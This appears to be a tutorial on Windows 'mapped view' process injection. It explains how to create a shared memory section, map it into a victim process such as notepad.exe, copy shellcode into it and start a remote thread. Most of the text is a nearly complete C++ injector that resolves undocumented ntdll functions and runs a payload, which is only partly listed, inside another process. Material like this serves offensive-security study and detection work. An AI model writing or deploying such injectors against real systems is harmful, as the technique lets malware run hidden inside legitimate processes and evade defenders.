In order to explain this injection technique, we are going to explain what is a **section** and a **mapped view** as we are going to use those terms.

- A **section** is a memory zone that is shared between processes and can be created with `NtCreateSection` API
- Before a process can read/write to that block of memory, it has to map a view of the said section, which can be done with `NtMapViewOfSection`
- Multiple processes can read from and write to the section through the mapped views

The idea is to create a section in **our process and after that create a view to store the shellcode in that region. We can't store the shellcode in a region without creating a view. After that, create a view in the remote process to be able to read the shellcode of the region, and create a remote thread using this remote view to trigger the shellcode execution.**

This mechanism does not copy the shellcode to the remote process, as we write the shellcode in a section inside our process, but the victim process uses a view to "read" the shellcode of the section in our process.
These are the high-level steps to perform the mapped view code injection:

1. Create a section that is a new region of memory in our own process using the `NtCreateSection`, for example. 
2. To be accessible from our process and write shellcode into the section, we create a view pointing to that section, using `NtMapViewOfSection`, for example. 
3. Using the view, we copy the shellcode to the memory section using `memcpy` , as this function only needs a pointer. 
4. Obtain a handle to the remote process, as always, with `OpenProcess` for example.
5. Create a remote view of that section **in the remote process.** The remote process has now access to the shellcode. We can create a view with `NtMapViewOfSection`, for example. 
6. Execute the shellcode using any known triggering mechanism, for example, `RtlCreateUserThread`, which spawns a new thread in the victim process.

This is a snippet of code that can be used to create a **mapped view process injection:**


```
int main() {

	unsigned char payload[] = {
	  0xfc, 0x48, 0x83, ...
	  };

	wchar_t process_name[MAX_PATH] = L"notepad.exe";
	DWORD pid = 0;
	pid = findMyProc(process_name);
	if (pid == 0) {
		printf("PID not found :( exiting...\n");
		return EXIT_FAILURE;
	}

	HANDLE hSection;
	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
	typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor;	PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
	typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID;
	using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE FileHandle OPTIONAL);
	myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtCreateSection"));

	// Create a memory section
	// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
	fNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create a view of the memory section in the local process
	PVOID localSectionAddress = NULL;
	using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
	myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
	fNtMapViewOfSection(hSection, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// create a view of the memory section in the target process
	PVOID remoteSectionAddress = NULL;
	HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	fNtMapViewOfSection(hSection, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, payload, sizeof(payload));

	// Create the thread pointing to the view
	using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID);
	myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread"));
	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);

	// printf("Local section address: %p\nRemote section address: %p\n", localSectionAddress, remoteSectionAddress);

	return EXIT_SUCCESS;

}
```

